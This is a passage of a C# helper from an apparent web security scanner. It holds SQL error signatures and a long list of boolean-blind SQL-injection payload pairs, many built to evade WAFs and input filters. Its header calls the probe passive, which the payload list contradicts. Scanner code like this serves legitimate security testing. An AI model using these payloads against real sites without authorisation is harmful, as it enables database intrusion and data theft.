using System;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ThreatScanner.Helpers
{
    /// <summary>
    /// Shared, passive SQL-injection error-disclosure probe.
    ///
    /// Both SqlInjectionForm and FullScannerForm call into this helper so the
    /// detection logic (error signatures, single-request probing of URL params
    /// and discovered &lt;form&gt; fields) lives in exactly one place.
    ///
    /// This is a passive disclosure check only — it appends a single quote to
    /// a parameter/field and looks for a DB error signature in the response.
    /// It does not chain payloads, confirm exploitability, or extract data.
    /// </summary>
    public static class SqlInjectionHelper
    {
        public static readonly string[] ErrorSignatures = {
            "sql syntax", "mysql_fetch", "mysqli_", "you have an error in your sql syntax",
            "microsoft ole db", "odbc sql server driver", "unclosed quotation mark",
            "sqlstate", "incorrect syntax near",
            "ora-00933", "ora-01756", "ora-",
            "pg_query", "warning: pg_", "postgresql query failed",
            "sqlite3.operationalerror", "sqlite_error", "sqlite",
            "syntax error", "unterminated string", "quoted string not properly terminated"
        };

        /// <summary>The default payload appended to params/fields ('). </summary>
        public const string Payload = "'";

        // ════════════════════════════════════════════════════════════════════════
        //  BOOLEAN-BASED SQLI PAYLOAD PAIRS (True / False)
        //  251 unique pairs covering: quote-style breakouts, comment terminators,
        //  parenthesis depth, LIKE-clause context, UNION variants, DBMS-specific
        //  primitives (MySQL/PostgreSQL/MSSQL/Oracle/SQLite), CASE/IF conditionals,
        //  subqueries, HAVING/GROUP BY, filter-evasion encodings, arithmetic/type
        //  coercion, ORDER BY column probes, string concat, JSON/XML, REGEXP,
        //  BETWEEN/IN, NULL handling, hex/binary literals, date functions, ANY/ALL
        //  quantifiers, fulltext MATCH, double-URL-encoding, versioned comments,
        //  multi-byte charset evasion, string functions, aggregates, window
        //  functions, CTEs, PostgreSQL arrays, compound boolean chains, comparison
        //  operators, magic-quote bypasses, and implicit type-juggling quirks.
        //
        //  Each pair is (True, False): appending True should preserve the original
        //  query's result set / behavior (boolean-true), while False should alter
        //  it (boolean-false). Comparing application responses to both payloads is
        //  the core signal for detecting boolean-based blind SQL injection.
        // ════════════════════════════════════════════════════════════════════════
        private static readonly (string True, string False)[] BooleanPayloadPairs = {
        ("' OR '1'='1-- -", "' AND '1'='2-- -"),  // single-quote breakout, terminator '-- -'
        ("' OR '1'='1#", "' AND '1'='2#"),  // single-quote breakout, terminator '#'
        ("' OR '1'='1/*", "' AND '1'='2/*"),  // single-quote breakout, terminator '/*'
        ("' OR '1'='1;--", "' AND '1'='2;--"),  // single-quote breakout, terminator ';--'
        ("' OR '1'='1-- ", "' AND '1'='2-- "),  // single-quote breakout, terminator '-- '
        ("' OR '1'='1", "' AND '1'='2"),  // single-quote breakout, terminator ''
        ("\" OR \"1\"=\"1-- -", "\" AND \"1\"=\"2-- -"),  // double-quote breakout, terminator '-- -'
        ("\" OR \"1\"=\"1#", "\" AND \"1\"=\"2#"),  // double-quote breakout, terminator '#'
        ("\" OR \"1\"=\"1/*", "\" AND \"1\"=\"2/*"),  // double-quote breakout, terminator '/*'
        ("\" OR \"1\"=\"1;--", "\" AND \"1\"=\"2;--"),  // double-quote breakout, terminator ';--'
        ("\" OR \"1\"=\"1-- ", "\" AND \"1\"=\"2-- "),  // double-quote breakout, terminator '-- '
        ("\" OR \"1\"=\"1", "\" AND \"1\"=\"2"),  // double-quote breakout, terminator ''
        ("` OR `1`=`1-- -", "` AND `1`=`2-- -"),  // backtick-quote breakout, terminator '-- -'
        ("` OR `1`=`1#", "` AND `1`=`2#"),  // backtick-quote breakout, terminator '#'
        ("` OR `1`=`1/*", "` AND `1`=`2/*"),  // backtick-quote breakout, terminator '/*'
        ("` OR `1`=`1;--", "` AND `1`=`2;--"),  // backtick-quote breakout, terminator ';--'
        ("` OR `1`=`1-- ", "` AND `1`=`2-- "),  // backtick-quote breakout, terminator '-- '
        ("` OR `1`=`1", "` AND `1`=`2"),  // backtick-quote breakout, terminator ''
        (" OR 1=1-- -", " AND 1=2-- -"),  // numeric context, terminator '-- -'
        (" OR 2>1-- -", " AND 2<1-- -"),  // inequality numeric, terminator '-- -'
        (" OR true-- -", " AND false-- -"),  // boolean literal, terminator '-- -'
        (" OR 1=1#", " AND 1=2#"),  // numeric context, terminator '#'
        (" OR 2>1#", " AND 2<1#"),  // inequality numeric, terminator '#'
        (" OR true#", " AND false#"),  // boolean literal, terminator '#'
        (" OR 1=1/*", " AND 1=2/*"),  // numeric context, terminator '/*'
        (" OR 2>1/*", " AND 2<1/*"),  // inequality numeric, terminator '/*'
        (" OR true/*", " AND false/*"),  // boolean literal, terminator '/*'
        (" OR 1=1;--", " AND 1=2;--"),  // numeric context, terminator ';--'
        (" OR 2>1;--", " AND 2<1;--"),  // inequality numeric, terminator ';--'
        (" OR true;--", " AND false;--"),  // boolean literal, terminator ';--'
        (" OR 1=1-- ", " AND 1=2-- "),  // numeric context, terminator '-- '
        (" OR 2>1-- ", " AND 2<1-- "),  // inequality numeric, terminator '-- '
        (" OR true-- ", " AND false-- "),  // boolean literal, terminator '-- '
        (" OR 1=1", " AND 1=2"),  // numeric context, terminator ''
        (" OR 2>1", " AND 2<1"),  // inequality numeric, terminator ''
        (" OR true", " AND false"),  // boolean literal, terminator ''
        (") OR (1=1-- -", ") AND (1=2-- -"),  // paren-depth 1 numeric, terminator '-- -'
        ("') OR ('1'='1-- -", "') AND ('1'='2-- -"),  // paren-depth 1 quoted, terminator '-- -'
        (") OR (1=1#", ") AND (1=2#"),  // paren-depth 1 numeric, terminator '#'
        ("') OR ('1'='1#", "') AND ('1'='2#"),  // paren-depth 1 quoted, terminator '#'
        (") OR (1=1", ") AND (1=2"),  // paren-depth 1 numeric, terminator ''
        ("') OR ('1'='1", "') AND ('1'='2"),  // paren-depth 1 quoted, terminator ''
        (")) OR ((1=1-- -", ")) AND ((1=2-- -"),  // paren-depth 2 numeric, terminator '-- -'
        ("')) OR (('1'='1-- -", "')) AND (('1'='2-- -"),  // paren-depth 2 quoted, terminator '-- -'
        (")) OR ((1=1#", ")) AND ((1=2#"),  // paren-depth 2 numeric, terminator '#'
        ("')) OR (('1'='1#", "')) AND (('1'='2#"),  // paren-depth 2 quoted, terminator '#'
        (")) OR ((1=1", ")) AND ((1=2"),  // paren-depth 2 numeric, terminator ''
        ("')) OR (('1'='1", "')) AND (('1'='2"),  // paren-depth 2 quoted, terminator ''
        ("))) OR (((1=1-- -", "))) AND (((1=2-- -"),  // paren-depth 3 numeric, terminator '-- -'
        ("'))) OR ((('1'='1-- -", "'))) AND ((('1'='2-- -"),  // paren-depth 3 quoted, terminator '-- -'
        ("))) OR (((1=1#", "))) AND (((1=2#"),  // paren-depth 3 numeric, terminator '#'
        ("'))) OR ((('1'='1#", "'))) AND ((('1'='2#"),  // paren-depth 3 quoted, terminator '#'
        ("))) OR (((1=1", "))) AND (((1=2"),  // paren-depth 3 numeric, terminator ''
        ("'))) OR ((('1'='1", "'))) AND ((('1'='2"),  // paren-depth 3 quoted, terminator ''
        (")))) OR ((((1=1-- -", ")))) AND ((((1=2-- -"),  // paren-depth 4 numeric, terminator '-- -'
        ("')))) OR (((('1'='1-- -", "')))) AND (((('1'='2-- -"),  // paren-depth 4 quoted, terminator '-- -'
        (")))) OR ((((1=1#", ")))) AND ((((1=2#"),  // paren-depth 4 numeric, terminator '#'
        ("')))) OR (((('1'='1#", "')))) AND (((('1'='2#"),  // paren-depth 4 quoted, terminator '#'
        (")))) OR ((((1=1", ")))) AND ((((1=2"),  // paren-depth 4 numeric, terminator ''
        ("')))) OR (((('1'='1", "')))) AND (((('1'='2"),  // paren-depth 4 quoted, terminator ''
        ("' OR '1' LIKE '1", "' AND '1' LIKE '2"),  // LIKE-clause context
        ("%' OR '1'='1", "%' AND '1'='2"),  // LIKE-clause context
        ("' OR '%'='%", "' AND '%'='x"),  // LIKE-clause context
        ("' OR 'a' LIKE 'a", "' AND 'a' LIKE 'b"),  // LIKE-clause context
        ("' OR 'abc' LIKE '%b%", "' AND 'abc' LIKE '%z%"),  // LIKE-clause context
        ("' OR 'test' LIKE 't%", "' AND 'test' LIKE 'z%"),  // LIKE-clause context
        ("' OR 'test' NOT LIKE 'z%", "' AND 'test' NOT LIKE 't%"),  // LIKE-clause context
        ("' OR 1 LIKE 1", "' AND 1 LIKE 2"),  // LIKE-clause context
        ("' UNION SELECT 1-- -", "' UNION SELECT 1 WHERE 1=2-- -"),  // UNION-based true/false
        ("' OR 'x'='x-- -", "' OR 'x'='y' AND '1'='2-- -"),  // UNION-friendly OR chain
        ("' UNION SELECT NULL-- -", "' UNION SELECT NULL WHERE 1=2-- -"),  // UNION NULL placeholder true/false
        ("' UNION ALL SELECT 1-- -", "' UNION ALL SELECT 1 WHERE 1=2-- -"),  // UNION ALL variant
        ("' UNION SELECT 1#", "' UNION SELECT 1 WHERE 1=2#"),  // UNION-based true/false
        ("' OR 'x'='x#", "' OR 'x'='y' AND '1'='2#"),  // UNION-friendly OR chain
        ("' UNION SELECT NULL#", "' UNION SELECT NULL WHERE 1=2#"),  // UNION NULL placeholder true/false
        ("' UNION ALL SELECT 1#", "' UNION ALL SELECT 1 WHERE 1=2#"),  // UNION ALL variant
        ("' UNION SELECT 1", "' UNION SELECT 1 WHERE 1=2"),  // UNION-based true/false
        ("' OR 'x'='x", "' OR 'x'='y' AND '1'='2"),  // UNION-friendly OR chain
        ("' UNION SELECT NULL", "' UNION SELECT NULL WHERE 1=2"),  // UNION NULL placeholder true/false
        ("' UNION ALL SELECT 1", "' UNION ALL SELECT 1 WHERE 1=2"),  // UNION ALL variant
        ("' OR SLEEP(0)='0", "' AND SLEEP(0)='1"),  // MySQL SLEEP no-op
        ("' OR TRUE-- -", "' OR FALSE-- -"),  // PostgreSQL boolean literal
        ("' OR 1=1::int-- -", "' AND 1=2::int-- -"),  // PostgreSQL type cast
        ("' OR 1=1;--", "' AND 1=2;--"),  // MSSQL batch terminator
        ("' OR 'a'='a", "' AND 'a'='b"),  // MSSQL simple compare
        ("' OR 1=1--", "' AND 1=2--"),  // Oracle double-dash comment
        ("' OR ROWNUM=1-- -", "' AND ROWNUM=0-- -"),  // Oracle ROWNUM pseudo-column
        ("' OR 1=1; -- ", "' AND 1=2; -- "),  // SQLite statement terminator
        ("' OR '1'='1' AND '1'='1", "' OR '1'='1' AND '1'='2"),  // SQLite chained AND
        ("' OR 1 XOR 0-- -", "' OR 1 XOR 1-- -"),  // MySQL XOR operator
        ("' OR 1=1 LIMIT 1-- -", "' AND 1=2 LIMIT 1-- -"),  // MySQL LIMIT-bound true/false
        ("' OR 1=1 OFFSET 0-- -", "' AND 1=2 OFFSET 0-- -"),  // PostgreSQL OFFSET-bound
        ("' OR TOP 1 1=1-- -", "' AND TOP 1 1=2-- -"),  // MSSQL TOP-bound
        ("' OR DUAL.DUMMY='X-- -", "' AND DUAL.DUMMY='Y-- -"),  // Oracle DUAL table reference
        ("' OR 1=1::text='1'-- -", "' AND 1=2::text='1'-- -"),  // PostgreSQL text cast compare
        ("' OR CAST(1 AS INT)=1-- -", "' AND CAST(1 AS INT)=2-- -"),  // generic CAST() compare
        ("' OR CONVERT(INT,1)=1-- -", "' AND CONVERT(INT,1)=2-- -"),  // MSSQL CONVERT() compare
        ("' OR 1=1 RETURNING 1-- -", "' AND 1=2 RETURNING 1-- -"),  // PostgreSQL RETURNING clause context
        ("' OR pg_sleep(0)=pg_sleep(0)-- -", "' AND pg_sleep(0)!=pg_sleep(0)-- -"),  // PostgreSQL sleep-as-boolean no-op
        ("' OR BENCHMARK(0,1)=0-- -", "' AND BENCHMARK(0,1)=1-- -"),  // MySQL BENCHMARK no-op identity
        ("' OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1-- -", "' OR (CASE WHEN 1=2 THEN 1 ELSE 0 END)=1-- -"),  // generic CASE expression
        ("' OR IF(1=1,1,0)=1-- -", "' OR IF(1=2,1,0)=1-- -"),  // MySQL IF() shorthand
        ("' OR IIF(1=1,1,0)=1-- -", "' OR IIF(1=2,1,0)=1-- -"),  // MSSQL IIF() shorthand
        ("' OR DECODE(1,1,1,0)=1-- -", "' OR DECODE(1,2,1,0)=1-- -"),  // Oracle DECODE conditional
        ("' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- -", "' OR (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1-- -"),  // subquery-wrapped CASE
        ("' OR NULLIF(1,1) IS NULL-- -", "' OR NULLIF(1,2) IS NULL-- -"),  // NULLIF()-based boolean
        ("' OR COALESCE(NULL,1)=1-- -", "' OR COALESCE(NULL,1)=2-- -"),  // COALESCE()-based boolean
        ("' OR (SELECT 1)=1-- -", "' OR (SELECT 1)=2-- -"),  // scalar subquery compare
        ("' OR EXISTS(SELECT 1)-- -", "' OR EXISTS(SELECT 1 WHERE 1=2)-- -"),  // EXISTS-based boolean
        ("' OR (SELECT COUNT(*) FROM (SELECT 1) x)=1-- -", "' OR (SELECT COUNT(*) FROM (SELECT 1) x)=2-- -"),  // derived-table count compare
        ("' OR 1=(SELECT 1)-- -", "' OR 2=(SELECT 1)-- -"),  // reversed scalar subquery compare
        ("' OR (SELECT 1 FROM DUAL)=1-- -", "' OR (SELECT 1 FROM DUAL)=2-- -"),  // Oracle DUAL-based subquery
        ("' OR NOT EXISTS(SELECT 1 WHERE 1=2)-- -", "' OR NOT EXISTS(SELECT 1)-- -"),  // NOT EXISTS-based boolean
        ("' OR (SELECT 1)=(SELECT 1)-- -", "' OR (SELECT 1)=(SELECT 2)-- -"),  // subquery-to-subquery compare
        ("' HAVING 1=1-- -", "' HAVING 1=2-- -"),  // HAVING clause injection
        ("' GROUP BY 1 HAVING 1=1-- -", "' GROUP BY 1 HAVING 1=2-- -"),  // GROUP BY + HAVING
        ("' GROUP BY 1,2 HAVING 1=1-- -", "' GROUP BY 1,2 HAVING 1=2-- -"),  // multi-column GROUP BY + HAVING
        ("' GROUP BY 1 HAVING 1=1#", "' GROUP BY 1 HAVING 1=2#"),  // GROUP BY + HAVING, hash terminator
        ("'+OR+'1'='1", "'+OR+'1'='2"),  // URL-encoded-space (+) variant
        ("'%20OR%20'1'='1", "'%20AND%20'1'='2"),  // explicit %20 encoded space
        ("\\' OR \\'1\\'=\\'1", "\\' AND \\'1\\'=\\'2"),  // escaped-quote bypass for addslashes()-style filters
        ("' OR 1=1%00", "' AND 1=2%00"),  // null-byte truncation
        ("' OR 1=1\n--", "' AND 1=2\n--"),  // newline-before-comment, bypasses single-line strip filters
        ("' OR 1=1\t-- -", "' AND 1=2\t-- -"),  // tab-separated, bypasses naive space-only filters
        ("'/**/OR/**/1=1-- -", "'/**/AND/**/1=2-- -"),  // inline comment instead of whitespace, evades space-stripping WAFs
        ("'%0aOR%0a1=1-- -", "'%0aAND%0a1=2-- -"),  // encoded newline as whitespace substitute
        ("' oR 1=1-- -", "' aND 1=2-- -"),  // mixed-case keyword, evades case-sensitive keyword filters
        ("' Or 1=1-- -", "' And 1=2-- -"),  // mixed-case keyword variant 2
        ("' OR/**/1=1-- -", "' AND/**/1=2-- -"),  // comment used as whitespace replacement before number
        ("' OR(1=1)-- -", "' AND(1=2)-- -"),  // no-space-before-paren, evades regex expecting a space
        ("'%09OR%091=1-- -", "'%09AND%091=2-- -"),  // encoded tab as whitespace substitute
        ("'%0dOR%0d1=1-- -", "'%0dAND%0d1=2-- -"),  // encoded carriage-return as whitespace substitute
        ("' /*!OR*/ 1=1-- -", "' /*!AND*/ 1=2-- -"),  // MySQL versioned-comment keyword wrap, evades literal keyword match
        ("' UnIoN SeLeCt 1-- -", "' UnIoN SeLeCt 1 WHERE 1=2-- -"),  // mixed-case UNION/SELECT keyword evasion
        ("' OR%0b1=1-- -", "' AND%0b1=2-- -"),  // encoded vertical-tab whitespace substitute
        ("' OR+1=1-- -", "' AND+1=2-- -"),  // plus-as-space form without surrounding quotes encoded
        ("' OR 1=1.0-- -", "' AND 1=2.0-- -"),  // float coercion, dodges int-only sanitizers
        ("' OR '1'!='2", "' OR '1'!='1"),  // inequality-based true/false
        ("' OR NOT 1=2-- -", "' OR NOT 1=1-- -"),  // negation-based, evades 'OR 1=1' signature matching
        ("' OR 3-2=1-- -", "' OR 3-2=2-- -"),  // arithmetic expression instead of literal
        ("' OR 2*2=4-- -", "' OR 2*2=5-- -"),  // multiplication expression
        ("' OR 10%3=1-- -", "' OR 10%3=2-- -"),  // modulo expression
        ("' OR ABS(-1)=1-- -", "' OR ABS(-1)=2-- -"),  // function-based numeric identity
        ("' OR LENGTH('a')=1-- -", "' OR LENGTH('a')=2-- -"),  // LENGTH() function compare
        ("' OR ASCII('a')=97-- -", "' OR ASCII('a')=98-- -"),  // ASCII() function compare
        ("' OR CHAR_LENGTH('a')=1-- -", "' OR CHAR_LENGTH('a')=2-- -"),  // CHAR_LENGTH() function compare
        ("' OR POWER(2,1)=2-- -", "' OR POWER(2,1)=3-- -"),  // POWER() function compare
        ("' OR SQRT(4)=2-- -", "' OR SQRT(4)=3-- -"),  // SQRT() function compare
        ("' OR FLOOR(1.5)=1-- -", "' OR FLOOR(1.5)=2-- -"),  // FLOOR() function compare
        ("' OR CEIL(1.5)=2-- -", "' OR CEIL(1.5)=3-- -"),  // CEIL() function compare
        ("' OR ROUND(1.4)=1-- -", "' OR ROUND(1.4)=2-- -"),  // ROUND() function compare
        ("' OR 5/5=1-- -", "' OR 5/5=2-- -"),  // division expression
        ("' OR 1<<1=2-- -", "' OR 1<<1=3-- -"),  // bitwise left-shift expression (MySQL/Postgres)
        ("' OR 2>>1=1-- -", "' OR 2>>1=2-- -"),  // bitwise right-shift expression
        ("' OR 1&1=1-- -", "' OR 1&1=0-- -"),  // bitwise AND expression
        ("' OR 1|0=1-- -", "' OR 1|0=0-- -"),  // bitwise OR expression
        ("1' OR '1'='1", "1' AND '1'='2"),  // numeric-prefixed ID parameter breakout
        ("1) OR (1=1", "1) AND (1=2"),  // numeric-prefixed paren breakout
        ("1' OR '1'='1' #", "1' AND '1'='2' #"),  // numeric-prefixed with hash terminator
        ("0 OR 1=1", "0 OR 1=2"),  // zero-prefixed numeric (defeats some int-cast filters)
        ("-1 OR 1=1", "-1 OR 1=2"),  // negative-prefixed numeric
        ("999999 OR 1=1", "999999 OR 1=2"),  // large-number-prefixed numeric
        ("1' OR 1=1 ORDER BY 1-- -", "1' AND 1=2 ORDER BY 1-- -"),  // ORDER BY tail after boolean
        ("1 OR 1=1 LIMIT 1,1-- -", "1 OR 1=2 LIMIT 1,1-- -"),  // MySQL LIMIT offset,count form
        ("' ORDER BY 1-- -", "' ORDER BY 999999-- -"),  // ORDER BY column-index probe (valid vs out-of-range)
        ("' ORDER BY (SELECT 1)-- -", "' ORDER BY (SELECT 1 WHERE 1=2)-- -"),  // ORDER BY subquery probe
        ("' ORDER BY 1 ASC-- -", "' ORDER BY 999999 ASC-- -"),  // ORDER BY ascending column-index probe
        ("' ORDER BY 1 DESC-- -", "' ORDER BY 999999 DESC-- -"),  // ORDER BY descending column-index probe
        ("' OR CONCAT('a','b')='ab'-- -", "' OR CONCAT('a','b')='ac'-- -"),  // MySQL CONCAT() compare
        ("' OR 'a'||'b'='ab'-- -", "' OR 'a'||'b'='ac'-- -"),  // Oracle/PostgreSQL/SQLite || concat operator compare
        ("' OR 'a'+'b'='ab'-- -", "' OR 'a'+'b'='ac'-- -"),  // MSSQL + string concat compare
        ("' OR JSON_EXTRACT('{\"a\":1}','$.a')=1-- -", "' OR JSON_EXTRACT('{\"a\":1}','$.a')=2-- -"),  // MySQL JSON_EXTRACT() compare
        ("' OR '{\"a\":1}'::json->>'a'='1'-- -", "' OR '{\"a\":1}'::json->>'a'='2'-- -"),  // PostgreSQL JSON arrow-operator compare
        ("' OR EXTRACTVALUE(1,'/a')='/a'-- -", "' OR EXTRACTVALUE(1,'/a')='/b'-- -"),  // MySQL EXTRACTVALUE() XML compare
        ("' OR 'abc' REGEXP '^a'-- -", "' OR 'abc' REGEXP '^z'-- -"),  // MySQL REGEXP compare
        ("' OR 'abc' ~ '^a'-- -", "' OR 'abc' ~ '^z'-- -"),  // PostgreSQL ~ regex operator compare
        ("' OR 'abc' SIMILAR TO 'a%'-- -", "' OR 'abc' SIMILAR TO 'z%'-- -"),  // PostgreSQL SIMILAR TO compare
        ("' OR 'abc' RLIKE '^a'-- -", "' OR 'abc' RLIKE '^z'-- -"),  // MySQL RLIKE alias compare
        ("' OR 1 BETWEEN 0 AND 2-- -", "' OR 1 BETWEEN 2 AND 3-- -"),  // BETWEEN range compare
        ("' OR 1 IN (1,2,3)-- -", "' OR 1 IN (4,5,6)-- -"),  // IN-list membership compare
        ("' OR 1 NOT IN (4,5,6)-- -", "' OR 1 NOT IN (1,2,3)-- -"),  // NOT IN-list membership compare
        ("' OR 'a' IN ('a','b')-- -", "' OR 'a' IN ('x','y')-- -"),  // string IN-list compare
        ("' OR NULL IS NULL-- -", "' OR 1 IS NULL-- -"),  // IS NULL compare
        ("' OR 1 IS NOT NULL-- -", "' OR NULL IS NOT NULL-- -"),  // IS NOT NULL compare
        ("' OR ISNULL(1,1)=1-- -", "' OR ISNULL(NULL,2)=1-- -"),  // MySQL/MSSQL ISNULL() compare
        ("' OR 0x31=0x31-- -", "' OR 0x31=0x32-- -"),  // hex literal compare (MySQL)
        ("' OR x'31'=x'31'-- -", "' OR x'31'=x'32'-- -"),  // hex string literal compare
        ("' OR 1=CONV('1',2,10)-- -", "' OR 1=CONV('10',2,10)-- -"),  // MySQL CONV() base conversion compare
        ("' OR 0b1=0b1-- -", "' OR 0b1=0b0-- -"),  // binary literal compare (MySQL)
        ("' OR UNHEX('31')='1'-- -", "' OR UNHEX('31')='2'-- -"),  // MySQL UNHEX() decode compare
        ("' OR HEX('1')='31'-- -", "' OR HEX('1')='32'-- -"),  // MySQL HEX() encode compare
        ("' OR CURDATE()=CURDATE()-- -", "' OR CURDATE()!=CURDATE()-- -"),  // MySQL CURDATE() identity compare
        ("' OR DATEDIFF(NOW(),NOW())=0-- -", "' OR DATEDIFF(NOW(),NOW())=1-- -"),  // DATEDIFF() zero-delta compare
        ("' OR EXTRACT(YEAR FROM NOW())>0-- -", "' OR EXTRACT(YEAR FROM NOW())<0-- -"),  // EXTRACT() YEAR compare
        ("' OR 1=ANY(SELECT 1)-- -", "' OR 1=ANY(SELECT 2)-- -"),  // ANY() quantifier compare
        ("' OR 1=ALL(SELECT 1)-- -", "' OR 2=ALL(SELECT 1)-- -"),  // ALL() quantifier compare
        ("' OR MATCH('a') AGAINST('a')-- -", "' OR MATCH('a') AGAINST('z')-- -"),  // MySQL fulltext MATCH AGAINST compare
        ("%27%20OR%20%271%27%3D%271", "%27%20AND%20%271%27%3D%272"),  // double-URL-encoded quote breakout
        ("%2527%2520OR%2520%25271%2527%253D%25271", "%2527%2520AND%2520%25271%2527%253D%25272"),  // %25-prefixed re-encoded breakout
        ("' /*!50000OR*/ 1=1-- -", "' /*!50000AND*/ 1=2-- -"),  // MySQL version-gated comment keyword wrap
        ("' OR/**/1/**/=/**/1-- -", "' AND/**/1/**/=/**/2-- -"),  // comments substituted for every whitespace token
        ("¿' OR '1'='1", "¿' AND '1'='2"),  // leading multi-byte lead-byte, can desync naive quote-escaping in some charsets
        ("%bf%27 OR %271%27=%271", "%bf%27 AND %271%27=%272"),  // URL-encoded multi-byte lead-byte + quote breakout
        ("' OR STRCMP('a','a')=0-- -", "' OR STRCMP('a','b')=0-- -"),  // MySQL STRCMP() equality compare
        ("' OR SUBSTRING('abc',1,1)='a'-- -", "' OR SUBSTRING('abc',1,1)='z'-- -"),  // SUBSTRING() character compare
        ("' OR SUBSTR('abc',1,1)='a'-- -", "' OR SUBSTR('abc',1,1)='z'-- -"),  // SUBSTR() alias character compare
        ("' OR LEFT('abc',1)='a'-- -", "' OR LEFT('abc',1)='z'-- -"),  // LEFT() character compare
        ("' OR RIGHT('abc',1)='c'-- -", "' OR RIGHT('abc',1)='z'-- -"),  // RIGHT() character compare
        ("' OR UPPER('a')='A'-- -", "' OR UPPER('a')='Z'-- -"),  // UPPER() case-transform compare
        ("' OR LOWER('A')='a'-- -", "' OR LOWER('A')='z'-- -"),  // LOWER() case-transform compare
        ("' OR TRIM(' a ')='a'-- -", "' OR TRIM(' a ')='z'-- -"),  // TRIM() whitespace-strip compare
        ("' OR REVERSE('ab')='ba'-- -", "' OR REVERSE('ab')='ab'-- -"),  // REVERSE() string compare
        ("' OR REPLACE('abc','b','x')='axc'-- -", "' OR REPLACE('abc','b','x')='abc'-- -"),  // REPLACE() substitution compare
        ("' OR GROUP_CONCAT(1)=1-- -", "' OR GROUP_CONCAT(1)=2-- -"),  // MySQL GROUP_CONCAT() aggregate compare
        ("' OR COUNT(*)>=0-- -", "' OR COUNT(*)<0-- -"),  // COUNT() non-negative identity (always true vs always false)
        ("' OR SUM(1)=1-- -", "' OR SUM(1)=2-- -"),  // SUM() aggregate compare
        ("' OR MAX(1)=1-- -", "' OR MAX(1)=2-- -"),  // MAX() aggregate compare
        ("' OR MIN(1)=1-- -", "' OR MIN(1)=2-- -"),  // MIN() aggregate compare
        ("' OR AVG(1)=1-- -", "' OR AVG(1)=2-- -"),  // AVG() aggregate compare
        ("1 ORDER BY (CASE WHEN 1=1 THEN 1 ELSE 1/0 END)-- -", "1 ORDER BY (CASE WHEN 1=2 THEN 1 ELSE 1/0 END)-- -"),  // ORDER BY conditional divide-by-zero error oracle
        ("'%a0OR%a01=1-- -", "'%a0AND%a01=2-- -"),  // encoded non-breaking-space whitespace substitute
        ("'%0cOR%0c1=1-- -", "'%0cAND%0c1=2-- -"),  // encoded form-feed whitespace substitute
        ("' OR ROW_NUMBER() OVER (ORDER BY 1)=1-- -", "' OR ROW_NUMBER() OVER (ORDER BY 1)=2-- -"),  // ROW_NUMBER() window function compare
        ("' OR RANK() OVER (ORDER BY 1)=1-- -", "' OR RANK() OVER (ORDER BY 1)=2-- -"),  // RANK() window function compare
        ("'; WITH x AS (SELECT 1) SELECT 1 FROM x WHERE 1=1-- -", "'; WITH x AS (SELECT 1) SELECT 1 FROM x WHERE 1=2-- -"),  // CTE (WITH clause) wrapped boolean
        ("' OR 1=ANY(ARRAY[1,2,3])-- -", "' OR 1=ANY(ARRAY[4,5,6])-- -"),  // PostgreSQL ARRAY ANY() membership compare
        ("' OR ARRAY[1,2]=ARRAY[1,2]-- -", "' OR ARRAY[1,2]=ARRAY[3,4]-- -"),  // PostgreSQL ARRAY equality compare
        ("' OR (1=1 AND 1=1) OR (1=2)-- -", "' OR (1=1 AND 1=2) OR (1=2)-- -"),  // compound AND/OR boolean chain, true branch
        ("' OR NOT (1=1 AND 1=2)-- -", "' OR NOT (1=1 AND 1=1)-- -"),  // negated compound AND boolean chain
        ("' OR 1=1-- '", "' AND 1=2-- '"),  // quote-matched trailing comment with self-quote terminator
        ("' OR 2=2-- '", "' AND 2=3-- '"),  // quote-matched trailing comment with self-quote terminator
        ("' OR 3>1-- '", "' AND 1>3-- '"),  // quote-matched trailing comment with self-quote terminator
        ("' OR 5<10-- '", "' AND 10<5-- '"),  // quote-matched trailing comment with self-quote terminator
        ("\" OR 1=1-- \"", "\" AND 1=2-- \""),  // quote-matched trailing comment with self-quote terminator
        ("\" OR 2=2-- \"", "\" AND 2=3-- \""),  // quote-matched trailing comment with self-quote terminator
        ("\" OR 3>1-- \"", "\" AND 1>3-- \""),  // quote-matched trailing comment with self-quote terminator
        ("\" OR 5<10-- \"", "\" AND 10<5-- \""),  // quote-matched trailing comment with self-quote terminator
        ("' OR (SELECT 1 FROM (SELECT 1) AS t)=1-- -", "' OR (SELECT 1 FROM (SELECT 1) AS t)=2-- -"),  // aliased derived-table subquery compare
        ("' OR EXISTS(SELECT * FROM (SELECT 1) AS t)-- -", "' OR EXISTS(SELECT * FROM (SELECT 1) AS t WHERE 1=2)-- -"),  // aliased derived-table EXISTS compare
        ("' OR 1 >= 1-- -", "' OR 1 < 1-- -"),  // greater-or-equal vs less-than numeric comparison
        ("' OR 1 <= 1-- -", "' OR 1 > 1-- -"),  // less-or-equal vs greater-than numeric comparison
        ("' OR 1<>2-- -", "' OR 1<>1-- -"),  // not-equal vs equal (inverted true/false roles)
        ("''='1'='1' OR ''='", "''='1'='2' AND ''='"),  // doubled-quote magic_quotes_gpc bypass attempt
        ("' OR ''='", "' AND ''='x"),  // empty-string self-compare bypass
        ("' OR '0'='0'-- -", "' OR '0'='1'-- -"),  // zero-string self-compare
        ("' OR 'true'='true'-- -", "' OR 'true'='false'-- -"),  // string-literal boolean-word compare
        ("' OR '' = ''-- -", "' OR '' = 'x'-- -"),  // empty-string equality compare
        ("' OR 1=1 WAITFOR DELAY '0:0:0'-- -", "' AND 1=2 WAITFOR DELAY '0:0:0'-- -"),  // MSSQL WAITFOR DELAY zero-duration no-op
        ("' OR @@VERSION IS NOT NULL-- -", "' AND @@VERSION IS NULL-- -"),  // MSSQL @@VERSION global-variable existence compare
        ("' OR 1=1 AND ROWNUM<=1-- -", "' AND 1=2 AND ROWNUM<=1-- -"),  // Oracle ROWNUM-bounded boolean
        ("' OR SYSDATE=SYSDATE-- -", "' AND SYSDATE!=SYSDATE-- -"),  // Oracle SYSDATE identity compare
    };

        /// <summary>Returns the matched error signature, or null if the body looks clean.</summary>
        public static string FindErrorSignature(string body)
        {
            if (string.IsNullOrEmpty(body)) return null;
            return ErrorSignatures.FirstOrDefault(err =>
                body.IndexOf(err, StringComparison.OrdinalIgnoreCase) >= 0);
        }

        // ════════════════════════════════════════════════════════════════════
        //  RESPONSE SIMILARITY (used by boolean-blind detection)
        // ════════════════════════════════════════════════════════════════════

        /// <summary>
        /// Cheap structural-similarity score between two response bodies, in
